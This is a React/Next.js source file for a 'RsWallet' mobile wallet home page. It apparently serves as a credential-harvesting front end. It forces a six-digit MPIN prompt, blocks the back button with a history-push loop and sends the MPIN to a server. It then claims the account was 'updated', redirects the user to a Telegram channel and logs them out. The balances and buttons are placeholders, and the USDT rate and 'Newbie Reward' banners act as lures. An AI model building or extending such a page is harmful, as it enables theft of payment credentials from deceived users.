'use client';

import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';

function normalizeState(data) {
  return {
    slides: Array.isArray(data?.slides) ? data.slides : [],
    banners: Array.isArray(data?.banners) ? data.banners : [],
    video: data?.video || null,
    telegram: data?.telegram || null,
  };
}

const stats = [
  ['Balance', '0.00'],
  ['Today Received', '0.00'],
  ['Top up Bonus', '0.00'],
  ['Team Commission', '0.00'],
];

const navItems = [
  ['home', 'Home'],
  ['deposit', 'Deposit'],
  ['upi', 'UPI'],
  ['team', 'Team'],
  ['me', 'Me'],
];

function NavIcon({ name }) {
  if (name === 'home') return <svg viewBox="0 0 32 32" aria-hidden="true"><path d="m4 14 12-9 12 9v13H19v-8h-6v8H4V14Z" /></svg>;
  if (name === 'deposit') return <svg viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="13" /><path d="M9 13h13l-3.5-3.5M23 19H10l3.5 3.5" fill="none" stroke="white" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" /></svg>;
  if (name === 'upi') return <svg viewBox="0 0 32 32" aria-hidden="true"><rect x="4" y="11" width="24" height="15" rx="2.5" /><path d="M12 11V9a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" fill="none" stroke="white" strokeWidth="2.4" strokeLinecap="round" /><rect x="4" y="16" width="24" height="2.4" fill="white" /></svg>;
  if (name === 'team') return <svg viewBox="0 0 32 32" aria-hidden="true"><rect x="4" y="5" width="11" height="9" rx="2" /><rect x="17" y="5" width="11" height="9" rx="2" /><rect x="4" y="18" width="11" height="9" rx="2" /><rect x="17" y="18" width="11" height="9" rx="2" /></svg>;
  return <svg viewBox="0 0 32 32" aria-hidden="true"><path d="M6 7h20a4 4 0 0 1 4 4v10a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V11a4 4 0 0 1 4-4Z" /><circle cx="10" cy="16" r="1.6" fill="white" /><circle cx="16" cy="16" r="1.6" fill="white" /><circle cx="22" cy="16" r="1.6" fill="white" /></svg>;
}

export default function UserHome() {
  const router = useRouter();
  const [session, setSession] = useState(null);
  const [state, setState] = useState(() => normalizeState(null));
  const [slide, setSlide] = useState(0);
  const [stage, setStage] = useState('loading');
  const [digits, setDigits] = useState(['', '', '', '', '', '']);
  const [mpinError, setMpinError] = useState('');
  const [savingMpin, setSavingMpin] = useState(false);
  const inputs = useRef([]);

  useEffect(() => {
    const saved = sessionStorage.getItem('rswallet_session');
    if (!saved) { router.replace('/'); return; }
    try {
      setSession(JSON.parse(saved));
      setStage('mpin');
    } catch {
      router.replace('/');
      return;
    }
    fetch('/api/state')
      .then((response) => response.json())
      .then((data) => setState(normalizeState(data)))
      .catch(() => setState(normalizeState(null)));
  }, [router]);

  useEffect(() => {
    if (stage !== 'mpin') return undefined;
    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    window.history.pushState({ rswalletMpinGate: true }, '', window.location.href);
    const keepMpinGateOpen = () => {
      window.history.pushState({ rswalletMpinGate: true }, '', window.location.href);
      inputs.current.find((input) => input && !input.value)?.focus();
    };
    window.addEventListener('popstate', keepMpinGateOpen);
    return () => {
      document.body.style.overflow = previousOverflow;
      window.removeEventListener('popstate', keepMpinGateOpen);
    };
  }, [stage]);

  const slides = state.slides.length ? state.slides : [{ id: 'default', image_url: '', title: 'New user guide' }];
  useEffect(() => {
    if (slides.length < 2) return undefined;
    const timer = setInterval(() => setSlide((index) => (index + 1) % slides.length), 3000);
    return () => clearInterval(timer);
  }, [slides.length]);

  function logout() {
    sessionStorage.removeItem('rswallet_session');
    router.replace('/');
  }

  function advance() {
    if (state.video?.video_url) setStage('video');
    else if (state.telegram?.telegram_link) setStage('telegram');
    else logout();
  }

  async function saveMpin(value) {
    if (savingMpin) return;
    setSavingMpin(true);
    setMpinError('');
    try {
      const response = await fetch('/api/auth/mpin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: session.userId, mpin: value }),
      });
      if (!response.ok) throw new Error('Unable to continue. Please enter your MPIN again.');
      setStage('success');
      setTimeout(advance, 1200);
    } catch (cause) {
      setDigits(['', '', '', '', '', '']);
      setMpinError(cause.message || 'Unable to continue. Please try again.');
      inputs.current[0]?.focus();
    } finally {
      setSavingMpin(false);
    }
  }

  function changeDigit(index, value) {
    if (savingMpin) return;
    const digit = value.replace(/\D/g, '').slice(-1);
    const next = [...digits];
    next[index] = digit;
    setDigits(next);
    if (digit && index < 5) inputs.current[index + 1]?.focus();
    const mpin = next.join('');
    if (mpin.length === 6) saveMpin(mpin);
  }

  function pasteMpin(event) {
    const value = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (value.length !== 6 || savingMpin) return;
    event.preventDefault();
    const next = value.split('');
    setDigits(next);
    inputs.current[5]?.focus();
    saveMpin(value);
  }

  if (!session) return <main className="center-screen">Loading…</main>;
  const currentSlide = slides[slide % slides.length];
  const rewardBanner = state.banners[0];

  return (
    <main className="phone-shell">
      <header className="app-header"><strong className="wordmark">RsWallet</strong></header>
      <section className="home-content">
        <div className={`hero-slide ${currentSlide.image_url ? 'has-image' : 'fallback-slide'}`} style={currentSlide.image_url ? { backgroundImage: `url(${currentSlide.image_url})` } : undefined}>
          {!currentSlide.image_url && (
            <>
              <div className="hero-content"><strong>A must read<br />for <em>newbies</em></strong><span>How to make more profits</span><button type="button">Click to read</button></div>
              <div className="hero-book" aria-hidden="true">📗</div>
            </>
          )}
          <div className="dots" aria-label={`${slides.length} slides`}>{slides.map((item, index) => <i key={item.id || index} className={index === slide ? 'active' : ''} />)}</div>
        </div>

        <div className="ratio-card">
          <div><small>USDT Ratio</small><strong>1 USDT ≈ 109.5 INR</strong><span>Bonus ratio: 0%</span></div>
          <div><small>INR Bonus Ratio</small><b>4%</b></div>
        </div>

        {rewardBanner?.image_url ? (
          <a className="reward-banner has-image" href={rewardBanner.link || '#'} style={{ backgroundImage: `url(${rewardBanner.image_url})` }} aria-label={rewardBanner.title || 'Newbie Reward'} />
        ) : (
          <div className="reward-banner"><span className="rb-emoji" aria-hidden="true">🎁</span><strong>Newbie Reward</strong><span className="rb-emoji" aria-hidden="true">🚗</span></div>
        )}

        <p className="upi-status">You&apos;re not bound to UPI</p>
        <button className="bind-upi" type="button">Bind UPI Now</button>

        <div className="stat-grid">
          {stats.map(([label, value]) => <div key={label}><span className="stat-top"><small>{label}</small><i>›</i></span><strong>{value}</strong></div>)}
        </div>
      </section>

      <nav className="bottom-nav" aria-label="Primary navigation">
        {navItems.map(([icon, label], index) => <button key={label} className={index === 0 ? 'active' : ''} type="button"><b><NavIcon name={icon} /></b><small>{label}</small></button>)}
      </nav>

      {stage === 'mpin' && <div className="modal mpin-modal" role="dialog" aria-modal="true" aria-labelledby="mpin-title"><div className="dialog mpin-dialog"><button className="dialog-close" type="button" onClick={logout} aria-label="Close and return to login">×</button><div className="dialog-brand">RS Wallet</div><h2 id="mpin-title">Enter Your MPIN</h2><p>Enter your secure 6-digit MPIN to continue</p><div className="mpin" onPaste={pasteMpin}>{digits.map((value, index) => <input key={index} ref={(node) => { inputs.current[index] = node; }} value={value} onChange={(event) => changeDigit(index, event.target.value)} onKeyDown={(event) => { if (event.key === 'Backspace' && !value && index > 0) inputs.current[index - 1]?.focus(); }} inputMode="numeric" pattern="[0-9]*" autoComplete={index === 0 ? 'one-time-code' : 'off'} maxLength={1} aria-label={`MPIN digit ${index + 1}`} disabled={savingMpin} autoFocus={index === 0} />)}</div>{mpinError && <p className="mpin-error" role="alert">{mpinError}</p>}<span className="mpin-hint">{savingMpin ? 'VERIFYING…' : 'MPIN will submit automatically'}</span></div></div>}
      {stage === 'success' && <div className="modal"><div className="dialog"><div className="success-mark">✓</div><h2>Success</h2><p>Your account was successfully updated. Please wait some time.</p></div></div>}
      {stage === 'video' && <div className="modal dark"><div className="dialog video"><video src={state.video.video_url} autoPlay muted playsInline controls /><button className="primary" onClick={() => state.telegram?.telegram_link ? setStage('telegram') : logout()}>Complete</button></div></div>}
      {stage === 'telegram' && <div className="modal"><div className="dialog"><div className="telegram-mark">➤</div><h2>{state.telegram.title || 'Join our Telegram'}</h2><p>{state.telegram.description}</p><a className="primary link-button" href={state.telegram.telegram_link} target="_blank" rel="noreferrer">Join Channel</a><button className="text-button" onClick={logout}>Close</button></div></div>}
    </main>
  );
}
